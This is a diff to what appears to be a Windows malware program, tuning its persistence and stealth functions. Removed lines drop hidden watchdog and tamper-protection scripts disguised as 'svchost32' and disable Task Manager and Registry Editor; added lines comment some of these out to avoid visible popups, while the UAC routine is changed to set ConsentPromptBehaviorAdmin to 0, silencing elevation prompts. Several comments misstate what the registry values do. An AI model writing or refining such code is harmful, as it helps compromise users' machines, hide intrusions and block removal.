@@ -2249,17 +2249,17 @@ if __name__ == "__main__":
     monitor_main_script()
 '''
         
-        # Save watchdog script
-        watchdog_path = os.path.join(tempfile.gettempdir(), "svchost32.py")
-        with open(watchdog_path, 'w') as f:
-            f.write(watchdog_script)
+        # DISABLED: Watchdog script to prevent Python window pop-ups
+        # watchdog_path = os.path.join(tempfile.gettempdir(), "svchost32.py")
+        # with open(watchdog_path, 'w') as f:
+        #     f.write(watchdog_script)
+        # 
+        # # Start watchdog process
+        # subprocess.Popen(['python.exe', watchdog_path], 
+        #                 creationflags=subprocess.CREATE_NO_WINDOW)
         
-        # Start watchdog process
-        subprocess.Popen(['python.exe', watchdog_path], 
-                        creationflags=subprocess.CREATE_NO_WINDOW)
-        
-        log_message(f"[OK] File locking persistence established: {watchdog_path}")
-        return True
+        log_message(f"[SKIP] Watchdog persistence disabled to prevent popup windows")
+        return False  # Changed to False to skip this persistence method
         
     except Exception as e:
         log_message(f"File locking persistence failed: {e}")
@@ -2287,16 +2287,17 @@ timeout /t 30 /nobreak >nul
 goto loop
 '''
         
-        watchdog_path = os.path.join(tempfile.gettempdir(), "svchost32.bat")
-        with open(watchdog_path, 'w') as f:
-            f.write(watchdog_batch)
+        # DISABLED: Watchdog batch to prevent popup windows
+        # watchdog_path = os.path.join(tempfile.gettempdir(), "svchost32.bat")
+        # with open(watchdog_path, 'w') as f:
+        #     f.write(watchdog_batch)
+        # 
+        # # Start watchdog
+        # subprocess.Popen(['cmd.exe', '/c', watchdog_path], 
+        #                 creationflags=subprocess.CREATE_NO_WINDOW)
         
-        # Start watchdog
-        subprocess.Popen(['cmd.exe', '/c', watchdog_path], 
-                        creationflags=subprocess.CREATE_NO_WINDOW)
-        
-        log_message(f"[OK] Watchdog persistence established: {watchdog_path}")
-        return True
+        log_message(f"[SKIP] Watchdog batch persistence disabled to prevent popup windows")
+        return False
         
     except Exception as e:
         log_message(f"Watchdog persistence failed: {e}")
@@ -2370,16 +2371,17 @@ if __name__ == "__main__":
     check_and_restore()
 '''
         
-        tamper_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
-        with open(tamper_path, 'w') as f:
-            f.write(tamper_script)
+        # DISABLED: Tamper protection to prevent Python window pop-ups
+        # tamper_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
+        # with open(tamper_path, 'w') as f:
+        #     f.write(tamper_script)
+        # 
+        # # Start tamper protection
+        # subprocess.Popen(['python.exe', tamper_path], 
+        #                 creationflags=subprocess.CREATE_NO_WINDOW)
         
-        # Start tamper protection
-        subprocess.Popen(['python.exe', tamper_path], 
-                        creationflags=subprocess.CREATE_NO_WINDOW)
-        
-        log_message(f"[OK] Tamper protection established: {tamper_path}")
-        return True
+        log_message(f"[SKIP] Tamper protection disabled to prevent popup windows")
+        return False
         
     except Exception as e:
         log_message(f"Tamper protection failed: {e}")
@@ -2391,17 +2393,9 @@ def disable_removal_tools():
         return False
     
     try:
-        # Set Task Manager registry value to 0 (keep enabled)
-        subprocess.run([
-            'reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
-            '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'
-        ], creationflags=subprocess.CREATE_NO_WINDOW)
-        
-        # Set Registry Editor registry value to 0 (keep enabled)
-        subprocess.run([
-            'reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
-            '/v', 'DisableRegistryTools', '/t', 'REG_DWORD', '/d', '1', '/f'
-        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        # Task Manager and Registry Editor are now kept ENABLED (not disabled)
+        # These registry entries are no longer set to allow normal system tool usage
+        log_message("[INFO] System tools (Task Manager, Registry Editor) remain enabled")
         
         # Set Command Prompt registry value to 0 (keep enabled)
         subprocess.run([
@@ -2736,14 +2730,16 @@ if __name__ == "__main__":
     check_and_restore()
 '''
         
-        # Create tamper protection script
-        tamper_script_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
-        with open(tamper_script_path, 'w') as f:
-            f.write(tamper_script)
+        # DISABLED: Tamper protection script to prevent Python window pop-ups
+        # tamper_script_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
+        # with open(tamper_script_path, 'w') as f:
+        #     f.write(tamper_script)
+        # 
+        # # Start tamper protection in background
+        # subprocess.Popen(['python.exe', tamper_script_path], 
+        #                 creationflags=subprocess.CREATE_NO_WINDOW)
         
-        # Start tamper protection in background
-        subprocess.Popen(['python.exe', tamper_script_path], 
-                        creationflags=subprocess.CREATE_NO_WINDOW)
+        log_message(f"[SKIP] Tamper protection script disabled to prevent popup windows")
         
         log_message("[OK] Tamper protection active")
         
@@ -2860,12 +2856,15 @@ if __name__ == "__main__":
     check_and_restore()
 '''
         
-        tamper_path = os.path.join(tempfile.gettempdir(), "tamper_protection.exe")
+        # DISABLED: Tamper protection executable to prevent popup windows
+        # tamper_path = os.path.join(tempfile.gettempdir(), "tamper_protection.exe")
+        # 
+        # # Create tamper protection executable using PyInstaller
+        # tamper_script_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
+        # with open(tamper_script_path, 'w') as f:
+        #     f.write(tamper_script)
         
-        # Create tamper protection executable using PyInstaller
-        tamper_script_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
-        with open(tamper_script_path, 'w') as f:
-            f.write(tamper_script)
+        log_message(f"[SKIP] Tamper protection exe disabled to prevent popup windows")
         
         # Build tamper protection executable
         try:
@@ -3535,9 +3534,10 @@ def disable_uac():
             winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 1)
             log_message("[REGISTRY] EnableLUA set successfully")
             
-            # Set ConsentPromptBehaviorAdmin to 0 (no prompts for administrators)
-            log_message("[REGISTRY] Setting ConsentPromptBehaviorAdmin = 1")
-            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 1, winreg.REG_DWORD, 1)
+            # Set ConsentPromptBehaviorAdmin to 0 (no password prompts for administrators)
+            # Changed from 1 to 0 to prevent password popup
+            log_message("[REGISTRY] Setting ConsentPromptBehaviorAdmin = 0 (no password prompt)")
+            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
             log_message("[REGISTRY] ConsentPromptBehaviorAdmin set successfully")
             
             # Set PromptOnSecureDesktop to 0 (disable secure desktop)
